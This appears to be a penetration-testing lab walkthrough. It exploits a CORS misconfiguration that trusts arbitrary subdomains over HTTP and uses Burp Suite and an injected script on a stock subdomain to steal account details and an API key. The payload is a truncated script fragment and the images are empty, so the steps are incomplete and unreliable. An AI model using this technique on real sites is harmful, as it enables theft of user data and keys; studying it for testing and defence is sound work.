---
id: 4aaa3c43-52d6-400f-b2f4-025ff8af3104
name: CORS Exploit Insecure Protocols
type: procedure
verified: true
submitted: true
created_at: '2020-08-17T09:40:24.083512+00:00'
updated_at: '2023-05-26T18:40:18.330704+00:00'
platforms:
- Web
tags:
- '[[CORS]]'
- '[[Web Applications]]'
---

# CORS Exploit Insecure Protocols

**Status**: âœ“ Verified

## Summary

The application has insecure CORS configuration that trusts all subdomains . 

## Description

# Description

The application has insecure CORS configuration that trusts all subdomains . 

# Instructions

# 

1. Login to the application with given credentials.





![4cae5bfa-d16a-4485-9d6e-6e36e3b40267.png]()







2. Intercept the request using burp Suite 









![1d3bc750-68c9-4a60-a05b-c782be947a43.png]()





3. Sent the request to the repeater by right clicking the intercepted request . Modify the origin header to check for CORS misconfiguration.Observe that the origin is reflected in the [`Access-Control-Allow-Origi](https://portswigger.net/web-security/cors/access-control-allow-origin)n` header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP







![e82ddfba-026b-4526-b664-665afe7216f5.png]()





4. Open the check stock and it can be observed that the request is loaded using* http.  *Use the following code to acess account detials through http protocol.





**Code**: [[<script>
   document.location="http://stock.$your]]







5. Decode the url using decoder in burpsuite to get the api access key.







![632ff713-50f7-42b5-9a9c-1b78d6b40825.png]()



## Platforms

- Web

## Tags

- [[CORS]]
- [[Web Applications]]


